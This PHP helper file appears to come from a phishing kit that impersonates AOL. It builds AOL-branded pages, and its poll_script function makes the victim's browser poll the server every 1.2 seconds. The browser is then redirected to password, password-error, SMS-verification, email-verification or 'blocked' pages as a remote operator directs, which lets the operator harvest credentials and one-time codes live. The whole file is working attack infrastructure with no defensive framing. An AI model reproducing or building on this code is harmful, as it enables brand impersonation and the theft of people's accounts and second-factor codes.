<?php
// helpers.php — AOL shared utilities

/* AOL wordmark SVG — exact bold "AOL" text logo */
function aol_logo(bool $large = false): string {
    $size = $large ? 'font-size:52px' : 'font-size:22px';
    $mb   = $large ? 'margin-bottom:20px' : '';
    return "<div style=\"font-family:'Arial Black',Arial,sans-serif;font-weight:900;color:#1a1a1a;{$size};{$mb};letter-spacing:-1px;line-height:1\">Aol.</div>";
}

/* AOL top-bar logo (small) */
function aol_topbar_logo(): string {
    return '<div style="font-family:\'Arial Black\',Arial,sans-serif;font-weight:900;color:#1a1a1a;font-size:20px;letter-spacing:-0.5px">Aol.</div>';
}

function err_icon(): string {
    return '<svg width="13" height="13" viewBox="0 0 24 24" fill="#c0392b" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="11"/><path d="M12 7v6" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/><circle cx="12" cy="17.5" r="1.2" fill="#fff"/></svg>';
}

/** Shared page open — AOL layout with top nav */
function page_open(string $title, bool $poll = false): void {
    $poll_js = $poll ? '<script>window.__POLL=true;</script>' : '';
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
  <title>{$title} | AOL</title>
  <link rel="stylesheet" href="style.css"/>
  {$poll_js}
</head>
<body>
<!-- AOL Top Navigation Bar -->
<nav class="aol-nav">
  <a href="index.php" class="nav-logo" style="text-decoration:none">
    <span style="font-family:'Arial Black','Arial Bold',Arial,sans-serif;font-weight:900;font-size:24px;color:#1a1a1a;letter-spacing:-0.5px">AOL</span>
  </a>
  <div class="nav-links">
    <a href="#">Help</a>
    <a href="#">Terms</a>
    <a href="#">Privacy</a>
  </div>
</nav>
<!-- Page content -->
<div class="page-bg">
HTML;
}

function page_close(): void {
    echo <<<HTML
</div><!-- /.page-bg -->
<script src="script.js"></script>
</body>
</html>
HTML;
}

/** Inline poll script — $stay = page states where we remain on this page */
function poll_script(array $stay = []): string {
    $stay_json = json_encode($stay);
    $success   = SUCCESS_URL;
    return <<<JS
<script>
(function(){
  const STAY = {$stay_json};
  const MAP  = {
    'loading':      'loading.php',
    'pw_error':     'password.php',
    'password':     'password.php',
    'sms_verify':   'sms-verify.php',
    'email_verify': 'email-verify.php',
    'code_error':   null,
    'blocked':      'blocked.php',
  };
  let redirecting = false;
  function poll(){
    if (redirecting) return;
    fetch('poll.php?t='+Date.now(), {cache:'no-store'})
      .then(r => r.json())
      .then(d => {
        if (redirecting) return;
        if (d.page === 'success') {
          redirecting = true;
          window.location.replace('{$success}');
          return;
        }
        if (STAY.includes(d.page)) return;
        const dest = MAP[d.page];
        if (dest) { redirecting = true; window.location.replace(dest); }
      }).catch(()=>{});
  }
  setInterval(poll, 1200);
  poll();
})();
</script>
JS;
}